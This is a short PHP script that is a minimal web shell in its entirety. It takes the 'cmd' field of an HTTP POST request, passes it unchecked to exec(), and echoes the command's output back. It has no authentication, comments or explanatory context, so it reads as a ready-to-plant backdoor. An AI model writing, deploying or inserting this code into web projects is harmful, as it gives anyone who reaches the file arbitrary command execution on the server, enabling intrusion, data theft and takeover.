<?php
function myshellexec($cmd)
{
    exec($cmd,$result); 
	$result = join("",$result);
    return $result;
}

$cmdline = $_POST['cmd'];
$ret = myshellexec($cmdline);
echo $ret;
?>